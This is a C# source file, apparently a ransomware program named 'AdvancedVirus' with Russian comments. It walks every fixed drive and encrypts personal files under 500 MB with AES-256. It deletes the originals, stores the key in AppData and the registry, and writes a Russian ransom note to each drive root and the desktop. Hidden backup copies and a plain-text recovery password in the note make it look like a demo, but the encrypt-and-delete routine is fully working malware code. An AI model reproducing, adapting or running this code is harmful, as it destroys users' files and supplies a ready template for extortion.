using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace AdvancedVirus
{
    public class FileEncryptor
    {
        private readonly string _encryptionExtension = ".encrypted";
        private byte[] _encryptionKey;

        public FileEncryptor()
        {
            GenerateEncryptionKey();
        }
        public async Task StartEncryptionWithCountdown()
        {
            Console.WriteLine("WARNING: File encryption will start in 15 seconds!");

            for (int i = 15; i > 0; i--)
            {
                Console.WriteLine($"Time remaining: {i} seconds...");
                await Task.Delay(1000);
            }

            Console.WriteLine("STARTING FILE ENCRYPTION NOW!");
            await EncryptUserFiles();
        }
            private void GenerateEncryptionKey()
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.GenerateKey();
                _encryptionKey = aes.Key;
            }
        }

        public async Task EncryptUserFiles()
        {
            try
            {
                var allDrives = GetSystemDrives();
                var encryptionTasks = new List<Task>();

                foreach (var drive in allDrives)
                {
                    if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                    {
                        encryptionTasks.Add(EncryptDriveAsync(drive.RootDirectory.FullName));
                    }
                }

                await Task.WhenAll(encryptionTasks);
                SaveEncryptionKeyForRecovery();
                ShowRansomNote();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Encryption error: {ex.Message}");
            }
        }

        private List<DriveInfo> GetSystemDrives()
        {
            return DriveInfo.GetDrives().ToList();
        }

        private async Task EncryptDriveAsync(string drivePath)
        {
            try
            {
                Console.WriteLine($"Starting encryption of drive: {drivePath}");
                await EncryptDirectoryAsync(drivePath);
                Console.WriteLine($"Completed encryption of drive: {drivePath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error encrypting drive {drivePath}: {ex.Message}");
            }
        }

        private async Task EncryptDirectoryAsync(string directoryPath)
        {
            try
            {
                var files = Directory.GetFiles(directoryPath);
                foreach (var file in files)
                {
                    if (ShouldEncryptFile(file))
                    {
                        await EncryptFileAsync(file);
                    }
                }

                var directories = Directory.GetDirectories(directoryPath);
                foreach (var directory in directories)
                {
                    if (ShouldEncryptDirectory(directory))
                    {
                        await EncryptDirectoryAsync(directory);
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                // Игнорируем папки, к которым нет доступа
            }
            catch (IOException)
            {
                // Игнорируем блокировки файлов
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Skipping {directoryPath}: {ex.Message}");
            }
        }

        private bool ShouldEncryptFile(string filePath)
        {
            var lowerPath = filePath.ToLowerInvariant();

            // Пропускаем уже зашифрованные
            if (filePath.EndsWith(_encryptionExtension, StringComparison.OrdinalIgnoreCase))
                return false;

            // Защита от шифрования критичных системных файлов
            if (lowerPath.Contains("\\windows\\") ||
            lowerPath.Contains("\\program files\\") ||
            lowerPath.Contains("\\program files (x86)\\") ||
            lowerPath.Contains("\\intel\\") ||
            lowerPath.Contains("\\nvidia corporation\\") ||
            lowerPath.Contains("\\microsoft\\") ||
            lowerPath.Contains("\\drivers\\") ||
            lowerPath.Contains("\\system32\\") ||
            lowerPath.Contains("\\syswow64\\") ||
            lowerPath.Contains("\\boot\\") ||
            lowerPath.Contains("\\perflogs\\") ||
            lowerPath.Contains("pagefile.sys") ||
            lowerPath.Contains("hiberfil.sys") ||
            lowerPath.Contains("swapfile.sys") ||
            lowerPath.Contains("bootmgr") ||
            lowerPath.Contains("$recycle.bin") ||
            lowerPath.Contains("system volume information"))
            {
                return false;
            }

            // Ограничиваем размер, чтобы не зависнуть на гигантских файлах
            try
            {
                var info = new FileInfo(filePath);
                return info.Length > 0 && info.Length <= 500 * 1024 * 1024; // ≤ 500 MB
            }
            catch
            {
                return false;
            }
        }

        private bool ShouldEncryptDirectory(string directoryPath)
        {
            var lowerPath = directoryPath.ToLowerInvariant();

            // Полностью пропускаем системные корневые папки
            if (lowerPath.Contains("\\windows") ||
                lowerPath.Contains("\\program files") ||
                lowerPath.Contains("\\program files (x86)") ||
                lowerPath.Contains("\\intel") ||
                lowerPath.Contains("\\nvidia corporation") ||
                lowerPath.Contains("\\microsoft") ||
                lowerPath.Contains("\\system volume information") ||
                lowerPath.Contains("$recycle.bin") ||
                lowerPath.Contains("\\perflogs") ||
                lowerPath.Contains("\\boot") ||
                lowerPath.Contains("\\drivers") ||
                lowerPath.EndsWith("\\system32") ||
                lowerPath.EndsWith("\\syswow64"))
            {
                return false;
            }

            return true;
        }

        private async Task EncryptFileAsync(string filePath)
        {
            try
            {
                // 1. Читаем оригинальный файл
                byte[] fileContent = await File.ReadAllBytesAsync(filePath);

                // 2. Шифруем его
                byte[] encryptedContent = EncryptData(fileContent);

                // 3. Сохраняем оригинальный файл в скрытую папку
                string backupDir = Path.Combine(Path.GetTempPath(), "backup_" + Environment.UserName);
                Directory.CreateDirectory(backupDir);

                // Устанавливаем атрибуты: Скрытая + Системная
                var dirInfo = new DirectoryInfo(backupDir);
                if (!dirInfo.Attributes.HasFlag(FileAttributes.Hidden))
                {
                    dirInfo.Attributes |= FileAttributes.Hidden;
                }
                if (!dirInfo.Attributes.HasFlag(FileAttributes.System))
                {
                    dirInfo.Attributes |= FileAttributes.System;
                }

                // Сохраняем оригинал с тем же именем, но с префиксом
                string backupPath = Path.Combine(backupDir, $"_backup_{Path.GetFileName(filePath)}");
                await File.WriteAllBytesAsync(backupPath, fileContent);

                // 4. Записываем зашифрованный файл на место оригинала
                string encryptedFilePath = filePath + _encryptionExtension;
                await File.WriteAllBytesAsync(encryptedFilePath, encryptedContent);

                // 5. Удаляем оригинальный файл
                File.Delete(filePath);

                Console.WriteLine($"✅ Encrypted: {filePath} -> {encryptedFilePath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Skip file {filePath}: {ex.Message}");
            }
        }

        private byte[] EncryptData(byte[] data)
        {
            using (var aes = Aes.Create())
            {
                aes.Key = _encryptionKey;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.GenerateIV();

                using (var encryptor = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                {
                    ms.Write(aes.IV, 0, aes.IV.Length);
                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                        cs.FlushFinalBlock();
                    }
                    return ms.ToArray();
                }
            }
        }

        private void SaveEncryptionKeyForRecovery()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string keyPath = Path.Combine(appData, "sys_recovery.bin");

                // Сохраняем в бинарном виде (менее заметно)
                File.WriteAllBytes(keyPath, _encryptionKey);

                // Также в реестр (на всякий случай)
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Recovery"))
                {
                    key.SetValue("Key", Convert.ToBase64String(_encryptionKey));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️ Key save error: {ex.Message}");
            }
        }

        public void ShowRansomNote()
        {
            string noteContent = @"
╔══════════════════════════════════════════════════════════════╗
║                     ВНИМАНИЕ! ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ!       ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║ Все личные файлы (документы, фото, видео, архивы и т.д.)     ║
║ были зашифрованы. Системные файлы не затронуты.              ║
║                                                              ║
║ Для восстановления введите пароль при перезагрузке.          ║
║ Пароль: recovery123                                          ║
║                                                              ║
║ Не пытайтесь переустанавливать Windows — это не поможет!     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
";

            var drives = DriveInfo.GetDrives()
                                  .Where(d => d.IsReady && d.DriveType == DriveType.Fixed);

            foreach (var drive in drives)
            {
                try
                {
                    string path = Path.Combine(drive.RootDirectory.FullName, "❗ВАШИ_ФАЙЛЫ_ЗАШИФРОВАНЫ.txt");
                    File.WriteAllText(path, noteContent, Encoding.UTF8);
                }
                catch { }
            }

            // На рабочий стол
            try
            {
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                File.WriteAllText(Path.Combine(desktop, "❗ВАШИ_ФАЙЛЫ_ЗАШИФРОВАНЫ.txt"), noteContent, Encoding.UTF8);
            }
            catch { }

            Console.WriteLine("📄 Ransom note created.");
        }

        public void ShowEncryptionStats()
        {
            long totalSize = 0;
            int totalFiles = 0;

            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                {
                    try
                    {
                        var stats = GetDriveFileStats(drive.RootDirectory.FullName);
                        totalFiles += stats.fileCount;
                        totalSize += stats.totalSize;
                    }
                    catch { }
                }
            }

            Console.WriteLine($"📁 Файлов для шифрования: {totalFiles:N0}");
            Console.WriteLine($"💾 Общий объём: {totalSize / (1024.0 * 1024.0):F2} MB");
        }

        private (int fileCount, long totalSize) GetDriveFileStats(string path)
        {
            int count = 0;
            long size = 0;

            try
            {
                foreach (var file in Directory.GetFiles(path))
                {
                    if (ShouldEncryptFile(file))
                    {
                        var fi = new FileInfo(file);
                        count++;
                        size += fi.Length;
                    }
                }

                foreach (var dir in Directory.GetDirectories(path))
                {
                    if (ShouldEncryptDirectory(dir))
                    {
                        var sub = GetDriveFileStats(dir);
                        count += sub.fileCount;
                        size += sub.totalSize;
                    }
                }
            }
            catch { }

            return (count, size);
        }
    }
}